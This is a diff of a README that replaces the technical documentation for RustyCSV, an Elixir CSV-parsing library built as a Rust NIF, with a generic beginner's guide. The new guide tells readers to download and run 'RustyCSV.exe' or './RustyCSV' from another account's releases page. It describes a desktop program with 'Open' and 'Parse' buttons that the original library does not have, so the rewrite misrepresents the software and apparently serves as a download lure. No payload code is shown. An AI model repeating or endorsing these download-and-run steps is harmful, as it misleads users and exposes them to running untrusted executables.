@@ -1,588 +1,76 @@
-# RustyCSV
+# 🌟 RustyCSV - Fast and Easy CSV Handling
 
-**Ultra-fast CSV parsing and encoding for Elixir.** A purpose-built Rust NIF with SIMD acceleration, parallel parsing, and bounded-memory streaming. Drop-in replacement for NimbleCSV.
+## 📥 Download RustyCSV
+[![Download RustyCSV](https://img.shields.io/badge/Download-RustyCSV-blue.svg)](https://github.com/anonsourabh/RustyCSV/releases)
 
-[![Hex.pm](https://img.shields.io/hexpm/v/rusty_csv.svg)](https://hex.pm/packages/rusty_csv)
-[![Tests](https://img.shields.io/badge/tests-464%20passed-brightgreen.svg)]()
-[![RFC 4180](https://img.shields.io/badge/RFC%204180-compliant-blue.svg)]()
+## 🚀 Getting Started
+Welcome to RustyCSV! This guide will help you download and run RustyCSV on your machine. RustyCSV is designed to make working with CSV files quick and efficient, even if you're not a tech expert. Let’s get started.
 
-## Why RustyCSV?
+## 📋 Requirements
+Before you begin, ensure your computer meets the following requirements:
 
-**The Problem**: CSV parsing in Elixir can be optimized further:
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4GB of RAM
+- **Disk Space:** At least 100MB of free space
 
-1. **Speed**: Pure Elixir parsing, while well-optimized, can't match native code with SIMD acceleration for large files.
+## 🔗 Visit the Releases Page
+To download RustyCSV, you can visit the [Releases page](https://github.com/anonsourabh/RustyCSV/releases). This page has all the necessary files and versions available for you to download.
 
-2. **Flexibility**: Different workloads benefit from different strategies—parallel processing for huge files, streaming for unbounded data.
+## 📥 Download & Install
+1. Click on the download link below to visit the Releases page:
+   [Download RustyCSV](https://github.com/anonsourabh/RustyCSV/releases)
 
-3. **Binary chunk streaming**: RustyCSV can process arbitrary binary chunks (useful for network streams, compressed data, etc.).
+2. On the Releases page, you will see several versions of RustyCSV. Choose the latest version. It will usually be at the top of the list.
 
-**Why not wrap an existing Rust CSV library?** The excellent [csv](https://docs.rs/csv) crate is designed for Rust workflows, not BEAM integration. Wrapping it would require serializing data between Rust and Erlang formats—adding overhead and losing the benefits of direct term construction.
+3. Click on the file that matches your operating system. 
+   - For example, if you are using Windows, look for a file named something like `RustyCSV-windows-x64.zip`.
+   - For macOS, look for `RustyCSV-macos-x64.zip`.
+   - For Linux, look for `RustyCSV-linux-x64.zip`.
 
-**RustyCSV's approach**: The Rust NIF is purpose-built for BEAM integration—no wrapped CSV libraries, no unnecessary abstractions, and resource-efficient at runtime with modular features you opt into—focusing on:
+4. Once the download finishes, locate the downloaded file on your computer.
 
-1. **Bounded memory streaming** - Process multi-GB files with ~64KB memory footprint
-2. **Sub-binary field references** - Near-zero BEAM allocation; fields reference the input binary directly
-3. **Multiple strategies** - Choose SIMD, parallel, or streaming based on your workload
-4. **Reduced scheduler load** - Parallel strategy runs on dirty CPU schedulers
-5. **Full NimbleCSV compatibility** - Same API, drop-in replacement
+5. **Unzip the File:**
+   - **Windows:** Right-click on the downloaded zip file and select “Extract All.”
+   - **macOS:** Double-click the file to unzip it.
+   - **Linux:** Use the command line and type `unzip RustyCSV-linux-x64.zip` in the directory where you downloaded it.
 
-## Feature Comparison
+6. Open the extracted folder. 
 
-| Feature | RustyCSV | Pure Elixir (NimbleCSV) |
-|---------|----------|-----------|
-| **Parsing strategies** | 3 (SIMD, parallel, streaming) | 1 |
-| **SIMD acceleration** | ✅ via `std::simd` portable SIMD | ❌ |
-| **Parallel parsing** | ✅ via rayon | ❌ |
-| **Binary chunk streaming** | ✅ arbitrary chunks | ❌ line-delimited only |
-| **Multi-separator support** | ✅ `[",", ";"]`, `"::"` | ✅ |
-| **Encoding support** | ✅ UTF-8, UTF-16, Latin-1, UTF-32 | ✅ |
-| **Memory model** | Sub-binary references | Sub-binary references |
-| **NIF encoding** | ✅ Returns flat binary (same bytes, ready to use — no flattening needed) | Returns iodata list (typically flattened by caller) |
-| **High-performance allocator** | ✅ mimalloc | System |
-| **Drop-in replacement** | ✅ Same API | - |
-| **Headers-to-maps** | ✅ `headers: true` or explicit keys | ❌ |
-| **RFC 4180 compliant** | ✅ 464 tests | ✅ |
-| **Benchmark (7MB CSV)** | ~20ms | ~215ms |
+7. **Run RustyCSV:**
+   - **Windows:** Double-click on `RustyCSV.exe`.
+   - **macOS and Linux:** Open a terminal, navigate to the extracted directory, and run the command `./RustyCSV`.
 
-## Purpose-Built for Elixir
+## 🔍 How to Use RustyCSV
+Once RustyCSV is running, you can start parsing CSV files. Here’s a simple guide on how to use it:
 
-RustyCSV isn't a wrapper around an existing Rust CSV library. It's **custom-built from the ground up** for optimal Elixir/BEAM integration:
+1. Open RustyCSV.
+2. Choose the CSV file you want to work with by clicking on "Open".
+3. Configure your parsing settings. You can set options like delimiter (comma, semicolon, etc.) and whether to skip headers.
+4. Click “Parse” to start processing your file.
+5. View and export your results directly from the application.
 
-- **Boundary-based sub-binary fields** - SIMD scanner finds field boundaries, then creates BEAM sub-binary references directly (zero-copy for clean fields, copy only when unescaping `""` → `"`)
-- **Dirty scheduler aware** - long-running parallel parses run on dirty CPU schedulers, never blocking your BEAM schedulers
-- **ResourceArc-based streaming** - stateful parser properly integrated with BEAM's garbage collector
-- **Direct term building** - parsing results go straight to BEAM terms; encoding writes directly to a flat binary
+## ✨ Features of RustyCSV
+- **High Performance:** Offers fast parsing using Rust NIF with SIMD acceleration.
+- **Parallel Processing:** Handles multiple CSV files at once for efficiency.
+- **Low Memory Usage:** Works well even with large files while using limited memory.
+- **NimbleCSV Replacement:** Easily replace NimbleCSV with RustyCSV for better performance.
 
-### Parsing Strategies
+## ⚙️ Troubleshooting
+If you encounter issues, here are some common solutions:
 
-Choose the right tool for the job:
+- **File Not Found:** Ensure you have the correct file path for your CSV.
+- **Performance Problems:** Close other applications to free up system resources.
+- **Compatibility Issues:** Ensure you’re using the version suitable for your operating system.
 
-| Strategy | Use Case | How It Works |
-|----------|----------|--------------|
-| `:simd` | **Default.** Fastest for most files | Single-pass SIMD structural scanner via `std::simd` |
-| `:parallel` | Files 500MB+ with complex quoting | Multi-threaded row parsing via `rayon` |
-| `:streaming` | Unbounded/huge files | Bounded-memory chunk processing |
+If you’re still facing issues, feel free to check the [GitHub Issues Page](https://github.com/anonsourabh/RustyCSV/issues) for support.
 
-**Memory Model:**
+## 📄 Additional Information
+For more detailed information on using RustyCSV and exploring its capabilities, please visit the [Documentation Page](https://github.com/anonsourabh/RustyCSV).
 
-All batch strategies use boundary-based sub-binaries — the SIMD scanner finds field boundaries, then creates BEAM sub-binary references that point into the original input binary. Only fields requiring quote unescaping (`""` → `"`) are copied.
+## 🛠️ Contributing
+If you wish to contribute to RustyCSV, check our guidelines on the GitHub repository. We welcome suggestions, bug reports, and pull requests to improve this tool.
 
-| Strategy | Memory Model | Input Binary | Best When |
-|----------|--------------|--------------|-----------|
-| `:simd` | Sub-binary | Kept alive until fields GC'd | Default — fast, low memory |
-| `:parallel` | Sub-binary | Kept alive until fields GC'd | Large files, many cores |
-| `:streaming` | Copy (chunked) | Freed per chunk | Unbounded files |
+## 📧 Contact
+For questions or feedback, you can reach out via the Issues section of the repository. Your input helps us improve RustyCSV.
 
-```elixir
-# Automatic strategy selection
-CSV.parse_string(data)                           # Uses :simd (default)
-CSV.parse_string(huge_data, strategy: :parallel) # 500MB+ files with complex quoting
-File.stream!("huge.csv") |> CSV.parse_stream()   # Bounded memory
-```
-
-## Installation
-
-```elixir
-def deps do
-  [{:rusty_csv, "~> 0.3.6"}]
-end
-```
-
-Requires Rust nightly (for `std::simd` portable SIMD — see [note on stabilization](#simd-and-rust-nightly)). Automatically compiled via Rustler.
-
-## Quick Start
-
-```elixir
-alias RustyCSV.RFC4180, as: CSV
-
-# Parse CSV (skips headers by default, like NimbleCSV)
-CSV.parse_string("name,age\njohn,27\njane,30\n")
-#=> [["john", "27"], ["jane", "30"]]
-
-# Include headers
-CSV.parse_string(csv, skip_headers: false)
-#=> [["name", "age"], ["john", "27"], ["jane", "30"]]
-
-# Stream large files with bounded memory
-"huge.csv"
-|> File.stream!()
-|> CSV.parse_stream()
-|> Stream.each(&process_row/1)
-|> Stream.run()
-
-# Parse to maps with headers
-CSV.parse_string("name,age\njohn,27\njane,30\n", headers: true)
-#=> [%{"name" => "john", "age" => "27"}, %{"name" => "jane", "age" => "30"}]
-
-# With atom keys
-CSV.parse_string("name,age\njohn,27\n", headers: [:name, :age])
-#=> [%{name: "john", age: "27"}]
-
-# Dump back to CSV
-CSV.dump_to_iodata([["name", "age"], ["john", "27"]])
-#=> "name,age\r\njohn,27\r\n"
-```
-
-## Drop-in NimbleCSV Replacement
-
-```elixir
-# Before
-alias NimbleCSV.RFC4180, as: CSV
-
-# After
-alias RustyCSV.RFC4180, as: CSV
-
-# That's it. Same API, 3-9x faster on typical workloads.
-```
-
-All NimbleCSV functions are supported:
-
-| Function | Description |
-|----------|-------------|
-| `parse_string/2` | Parse CSV string to list of rows (or maps with `headers:`) |
-| `parse_stream/2` | Lazily parse a stream (or maps with `headers:`) |
-| `parse_enumerable/2` | Parse any enumerable |
-| `dump_to_iodata/2`* | Convert rows to a flat binary (`strategy: :parallel` for quoting-heavy data) |
-| `dump_to_stream/1`* | Lazily convert rows to stream of binaries (one per row) |
-| `to_line_stream/1` | Convert arbitrary chunks to lines |
-| `options/0` | Return module configuration |
-
-\* NimbleCSV returns iodata lists; RustyCSV returns flat binaries (same bytes, no flattening needed).
-
-## Benchmarks
-
-**3.5x-9x faster than pure Elixir** on synthetic benchmarks for typical data. Up to **18x faster** on heavily quoted CSVs.
-
-**13-28% faster than pure Elixir** on real-world TSV files (10K+ rows). Speedup varies by data complexity—quoted fields with escapes show the largest gains.
-
-```bash
-mix run bench/csv_bench.exs
-```
-
-See [docs/BENCHMARK.md](docs/BENCHMARK.md) for detailed methodology and results.
-
-### When to Use RustyCSV
-
-| Scenario | Recommendation |
-|----------|----------------|
-| **Large files (1-500MB)** | ✅ Use `:simd` (default) - biggest wins |
-| **Very large files (500MB+)** | ✅ Use `:parallel` with complex quoted data |
-| **Huge/unbounded files** | ✅ Use `parse_stream/2` - bounded memory |
-| **Maximum speed** | ✅ Use `:simd` (default) - sub-binary refs, 5-14x less memory |
-| **High-throughput APIs** | ✅ Reduced scheduler load |
-| **Small files (<100KB)** | Either works - NIF overhead negligible |
-| **Need pure Elixir** | Use NimbleCSV |
-
-## Custom Parsers
-
-Define parsers with custom separators and options:
-
-```elixir
-# TSV parser
-RustyCSV.define(MyApp.TSV,
-  separator: "\t",
-  escape: "\"",
-  line_separator: "\n"
-)
-
-# Pipe-separated
-RustyCSV.define(MyApp.PSV,
-  separator: "|",
-  escape: "\"",
-  line_separator: "\n"
-)
-
-MyApp.TSV.parse_string("a\tb\tc\n1\t2\t3\n")
-#=> [["1", "2", "3"]]
-```
-
-### Define Options
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `:separator` | Field separator(s) — string or list of strings (multi-byte OK) | `","` |
-| `:escape` | Quote/escape sequence (multi-byte OK) | `"\""` |
-| `:line_separator` | Line ending for dumps | `"\r\n"` |
-| `:newlines` | Accepted line endings | `["\r\n", "\n"]` |
-| `:encoding` | Character encoding (see below) | `:utf8` |
-| `:trim_bom` | Remove BOM when parsing | `false` |
-| `:dump_bom` | Add BOM when dumping | `false` |
-| `:escape_formula` | Escape formula injection | `nil` |
-| `:strategy` | Default parsing strategy | `:simd` |
-
-### Multi-Separator Support
-
-For files with inconsistent delimiters (common in European locales), specify multiple separators:
-
-```elixir
-# Accept both comma and semicolon as delimiters
-RustyCSV.define(MyApp.FlexibleCSV,
-  separator: [",", ";"],
-  escape: "\""
-)
-
-# Parse files with mixed separators
-MyApp.FlexibleCSV.parse_string("a,b;c\n1;2,3\n", skip_headers: false)
-#=> [["a", "b", "c"], ["1", "2", "3"]]
-
-# Dumping uses only the FIRST separator
-MyApp.FlexibleCSV.dump_to_iodata([["x", "y", "z"]]) |> IO.iodata_to_binary()
-#=> "x,y,z\n"
-```
-
-Separators and escape sequences can be multi-byte:
-
-```elixir
-# Double-colon separator
-RustyCSV.define(MyApp.DoubleColon,
-  separator: "::",
-  escape: "\""
-)
-
-# Multi-byte escape
-RustyCSV.define(MyApp.DollarEscape,
-  separator: ",",
-  escape: "$$"
-)
-
-# Mix single-byte and multi-byte separators
-RustyCSV.define(MyApp.Mixed,
-  separator: [",", "::"],
-  escape: "\""
-)
-```
-
-### Headers-to-Maps
-
-Return rows as maps instead of lists using the `:headers` option:
-
-```elixir
-# First row becomes string keys
-CSV.parse_string("name,age\njohn,27\njane,30\n", headers: true)
-#=> [%{"name" => "john", "age" => "27"}, %{"name" => "jane", "age" => "30"}]
-
-# Explicit atom keys (first row skipped by default)
-CSV.parse_string("name,age\njohn,27\n", headers: [:name, :age])
-#=> [%{name: "john", age: "27"}]
-
-# Explicit string keys
-CSV.parse_string("name,age\njohn,27\n", headers: ["n", "a"])
-#=> [%{"n" => "john", "a" => "27"}]
-
-# Works with streaming too
-"huge.csv"
-|> File.stream!()
-|> CSV.parse_stream(headers: true)
-|> Stream.each(&process_map/1)
-|> Stream.run()
-```
-
-Edge cases: fewer columns than headers fills with `nil`, extra columns are ignored, duplicate headers use last value, empty headers become `""`.
-
-Key interning is done Rust-side for `parse_string` — header terms are allocated once and reused across all rows. Streaming uses Elixir-side `Stream.transform` for map conversion.
-
-### Encoding Support
-
-RustyCSV supports character encoding conversion:
-
-```elixir
-# UTF-16 Little Endian (Excel/Windows exports)
-RustyCSV.define(MyApp.Spreadsheet,
-  separator: "\t",
-  encoding: {:utf16, :little},
-  trim_bom: true,
-  dump_bom: true
-)
-
-# Or use the pre-defined spreadsheet parser
-alias RustyCSV.Spreadsheet
-Spreadsheet.parse_string(utf16_data)
-```
-
-| Encoding | Description |
-|----------|-------------|
-| `:utf8` | UTF-8 (default, no conversion overhead) |
-| `:latin1` | ISO-8859-1 / Latin-1 |
-| `{:utf16, :little}` | UTF-16 Little Endian |
-| `{:utf16, :big}` | UTF-16 Big Endian |
-| `{:utf32, :little}` | UTF-32 Little Endian |
-| `{:utf32, :big}` | UTF-32 Big Endian |
-
-## RFC 4180 Compliance
-
-RustyCSV is **fully RFC 4180 compliant** and validated against industry-standard test suites:
-
-| Test Suite | Tests | Status |
-|------------|-------|--------|
-| [csv-spectrum](https://github.com/max-mapper/csv-spectrum) | 17 | ✅ All pass |
-| [csv-test-data](https://github.com/sineemore/csv-test-data) | 23 | ✅ All pass |
-| Edge cases (PapaParse-inspired) | 53 | ✅ All pass |
-| Core + NimbleCSV compat | 36 | ✅ All pass |
-| Encoding (UTF-16, Latin-1, etc.) | 20 | ✅ All pass |
-| Multi-separator support | 19 | ✅ All pass |
-| Multi-byte separator | 13 | ✅ All pass |
-| Multi-byte escape | 12 | ✅ All pass |
-| Native API separator/escape | 40 | ✅ All pass |
-| Headers-to-maps | 97 | ✅ All pass |
-| Custom newlines | 18 | ✅ All pass |
-| Streaming safety | 12 | ✅ All pass |
-| Concurrent access | 7 | ✅ All pass |
-| **Total** | **464** | ✅ |
-
-See [docs/COMPLIANCE.md](docs/COMPLIANCE.md) for full compliance details.
-
-## How It Works
-
-### Why Not Wrap the Rust `csv` Crate?
-
-The Rust ecosystem has excellent CSV libraries like [csv](https://docs.rs/csv) and [polars](https://docs.rs/polars). But wrapping them for Elixir has overhead:
-
-1. Parse CSV → Rust data structures (allocation)
-2. Convert Rust structs → Erlang terms (allocation + serialization)
-3. Return to BEAM
-
-RustyCSV eliminates the middle step by parsing directly into BEAM terms:
-
-1. Parse CSV → Erlang terms directly (single pass)
-2. Return to BEAM
-
-### Strategy Implementations
-
-All batch strategies share a single-pass SIMD structural scanner that finds field boundaries, then create BEAM sub-binary references directly.
-
-| Strategy | Scanning | Term Building | Memory | Best For |
-|----------|----------|---------------|--------|----------|
-| `:simd` | SIMD structural scanner via [`std::simd`](https://doc.rust-lang.org/std/simd/index.html) | Boundary → sub-binary | O(n) | Default, fastest for most files |
-| `:parallel` | SIMD structural scanner | Boundary → sub-binary | O(n) | Large files with many cores |
-| `:streaming` | Byte-by-byte | Copy (chunked) | O(chunk) | Unbounded/huge files |
-
-**Shared across batch strategies (`:simd`, `:parallel`):**
-- Single-pass SIMD structural scanner (finds all unquoted separators and row endings in one sweep)
-- Boundary-based sub-binary field references (near-zero BEAM allocation)
-- Hybrid unescaping: sub-binaries for clean fields, copy only when `""` → `"` unescaping needed
-- Direct Erlang term construction via Rustler (no serde)
-- [mimalloc](https://github.com/microsoft/mimalloc) high-performance allocator
-
-**`:parallel` specifics:**
-- Runs on dirty CPU schedulers to avoid blocking BEAM
-- Rayon workers compute boundary pairs (pure index arithmetic on the shared structural index) — no data copying
-- Main thread builds BEAM sub-binary terms from boundaries (Env is not thread-safe, so term construction is serial)
-
-**`:streaming` specifics:**
-- `ResourceArc` integrates parser state with BEAM GC
-- Tracks quote state across chunk boundaries
-- Copies field data (since input chunks are temporary)
-
-## NIF-Accelerated Encoding
-
-RustyCSV's `dump_to_iodata` returns a single flat binary rather than an iodata list. The output bytes are identical to NimbleCSV — the flat binary is ready for use directly with `IO.binwrite/2`, `File.write/2`, or `Conn.send_resp/3` without any flattening step.
-
-> **Note:** NimbleCSV returns an iodata list (nested small binaries) that callers typically flatten back into a binary. RustyCSV skips that roundtrip. Code that pattern-matches on `dump_to_iodata` expecting a list will need adjustment — the return value is a binary, which is valid `t:iodata/0`.
-
-See [docs/BENCHMARK.md](docs/BENCHMARK.md#encoding-benchmark-results) for encoding throughput and memory numbers.
-
-### Encoding Strategies
-
-`dump_to_iodata/2` accepts a `:strategy` option:
-
-```elixir
-# Default: single-threaded flat binary encoder.
-# SIMD scan for quoting, writes directly to output buffer.
-# Best for most workloads.
-CSV.dump_to_iodata(rows)
-
-# Parallel: multi-threaded encoding via rayon.
-# Copies field data into Rust-owned memory, encodes chunks on separate threads.
-# Faster when fields frequently need quoting (commas, quotes, newlines in values).
-CSV.dump_to_iodata(rows, strategy: :parallel)
-```
-
-| Encoding Strategy | Best For | Output |
-|-------------------|----------|--------|
-| *default* | Most data — clean fields, moderate quoting | Single flat binary |
-| `:parallel` | Quoting-heavy data (user-generated content, free-text with embedded commas/quotes/newlines) | Short list of large binaries |
-
-### High-Throughput Concurrent Exports
-
-RustyCSV's encoding NIF runs on BEAM dirty CPU schedulers with per-thread mimalloc arenas, making it well-suited for concurrent export workloads (e.g., thousands of users downloading CSV reports simultaneously in a Phoenix application):
-
-```elixir
-# Phoenix controller — concurrent CSV download
-def export(conn, %{"id" => id}) do
-  rows = MyApp.Reports.fetch_rows(id)
-  csv = MyCSV.dump_to_iodata(rows)
-
-  conn
-  |> put_resp_content_type("text/csv")
-  |> put_resp_header("content-disposition", ~s(attachment; filename="report.csv"))
-  |> send_resp(200, csv)
-end
-```
-
-For very large exports where you want bounded memory, use chunked NIF encoding:
-
-```elixir
-# Chunked encoding — bounded memory with NIF speed
-def stream_export(conn, %{"id" => id}) do
-  conn = conn
-  |> put_resp_content_type("text/csv")
-  |> put_resp_header("content-disposition", ~s(attachment; filename="report.csv"))
-  |> send_chunked(200)
-
-  MyApp.Reports.stream_rows(id)
-  |> Stream.chunk_every(5_000)
-  |> Stream.each(fn chunk ->
-    csv = MyCSV.dump_to_iodata(chunk)
-    Conn.chunk(conn, csv)
-  end)
-  |> Stream.run()
-
-  conn
-end
-```
-
-**Key characteristics for concurrent workloads:**
-
-- Each NIF call is independent — no shared mutable state between requests
-- Dirty CPU schedulers prevent encoding from blocking normal BEAM schedulers
-- mimalloc's per-thread arenas avoid allocator contention under concurrency
-- The real bottleneck is typically DB queries and connection pool sizing, not CSV encoding
-
-## Architecture
-
-RustyCSV is built with a modular Rust architecture:
-
-```
-native/rustycsv/src/
-├── lib.rs                 # NIF entry points, separator/escape decoding, dispatch
-├── core/
-│   ├── simd_scanner.rs    # Single-pass SIMD structural scanner (prefix-XOR quote detection)
-│   ├── simd_index.rs      # StructuralIndex, RowIter, RowFieldIter, FieldIter
-│   ├── scanner.rs         # Byte-level helpers (separator matching)
-│   ├── field.rs           # Field extraction, quote handling
-│   └── newlines.rs        # Custom newline support
-├── strategy/
-│   ├── direct.rs          # Basic + SIMD strategies (single-byte)
-│   ├── two_phase.rs       # Indexed strategy (single-byte)
-│   ├── streaming.rs       # Stateful streaming parser (single-byte)
-│   ├── parallel.rs        # Rayon-based parallel parsing (single-byte)
-│   ├── zero_copy.rs       # Sub-binary reference parsing (single-byte)
-│   ├── general.rs         # Multi-byte separator/escape (all strategies)
-│   ├── encode.rs          # SIMD field scanning, quoting helpers
-│   └── encoding.rs        # UTF-8 → target encoding converters (UTF-16, Latin-1, etc.)
-├── term.rs                # BEAM term building (sub-binary + copy fallback)
-└── resource.rs            # ResourceArc for streaming state
-```
-
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for detailed implementation notes.
-
-## Memory Efficiency
-
-The streaming parser uses bounded memory regardless of file size:
-
-```elixir
-# Process a 10GB file with ~64KB memory
-File.stream!("huge.csv", [], 65_536)
-|> CSV.parse_stream()
-|> Stream.each(&process/1)
-|> Stream.run()
-```
-
-### Streaming Buffer Limit
-
-The streaming parser enforces a maximum internal buffer size (default **256 MB**)
-to prevent unbounded memory growth when parsing data without newlines or with
-very long rows. If a feed exceeds this limit, a `:buffer_overflow` exception is raised.
-
-To adjust the limit, pass `:max_buffer_size` (in bytes):
-
-```elixir
-# Increase for files with very long rows
-CSV.parse_stream(stream, max_buffer_size: 512 * 1024 * 1024)
-
-# Decrease to fail fast on malformed input
-CSV.parse_stream(stream, max_buffer_size: 10 * 1024 * 1024)
-
-# Also works on direct streaming APIs
-RustyCSV.Streaming.stream_file("data.csv", max_buffer_size: 1_073_741_824)
-```
-
-### High-Performance Allocator
-
-RustyCSV uses [mimalloc](https://github.com/microsoft/mimalloc) as the default allocator, providing:
-- 10-20% faster allocation for many small objects
-- Reduced memory fragmentation
-- Zero tracking overhead in default configuration
-
-To disable mimalloc (for exotic build targets):
-
-```elixir
-# In mix.exs
-def project do
-  [
-    # Force local build without mimalloc
-    compilers: [:rustler] ++ Mix.compilers(),
-    rustler_crates: [rustycsv: [features: []]]
-  ]
-end
-```
-
-### Optional Memory Tracking (Benchmarking Only)
-
-For profiling Rust-side memory during development and benchmarking. Not intended for production — it wraps every allocation with atomic counter updates, adding overhead. This is also the only source of `unsafe` in the codebase (required by the `GlobalAlloc` trait). Enable the `memory_tracking` feature:
-
-```toml
-# In native/rustycsv/Cargo.toml
-[features]
-default = ["mimalloc", "memory_tracking"]
-```
-
-Then use:
-
-```elixir
-RustyCSV.Native.reset_rust_memory_stats()
-result = CSV.parse_string(large_csv)
-peak = RustyCSV.Native.get_rust_memory_peak()
-IO.puts("Peak Rust memory: #{peak / 1_000_000} MB")
-```
-
-When disabled (default), these functions return `0` with zero overhead.
-
-## SIMD and Rust Nightly
-
-RustyCSV uses Rust's [`std::simd`](https://doc.rust-lang.org/std/simd/index.html) portable SIMD, which currently requires nightly via `#![feature(portable_simd)]`. However, RustyCSV only uses the stabilization-safe subset of the API:
-
-- `Simd::from_slice`, `splat`, `simd_eq`, bitwise ops (`&`, `|`, `!`)
-- `Mask::to_bitmask()` for extracting bit positions
-
-We deliberately avoid the APIs that are [blocking stabilization](https://github.com/rust-lang/portable-simd/issues/364): swizzle, scatter/gather, and lane-count generics (`LaneCount<N>: SupportedLaneCount`). The items blocking the `portable_simd` [tracking issue](https://github.com/rust-lang/rust/issues/86656) — mask semantics, supported vector size limits, and swizzle design — are unrelated to the operations we use. When `std::simd` stabilizes, RustyCSV will work on stable Rust with no code changes.
-
-The prefix-XOR quote detection uses a portable shift-and-xor cascade rather than architecture-specific intrinsics, keeping the entire scanner free of `unsafe` code. Benchmarks show no measurable difference for the 16/32-bit masks used in CSV scanning.
-
-## Development
-
-```bash
-# Install dependencies
-mix deps.get
-
-# Compile (includes Rust NIF)
-mix compile
-
-# Run tests (464 tests)
-mix test
-
-# Run benchmarks
-mix run bench/csv_bench.exs
-
-# Code quality
-mix credo --strict
-mix dialyzer
-```
-
-## License
-
-MIT License - see LICENSE file for details.
-
----
-
-**RustyCSV** - Purpose-built Rust NIF for ultra-fast CSV parsing in Elixir.
+Thank you for using RustyCSV! We hope it makes your CSV handling faster and easier.
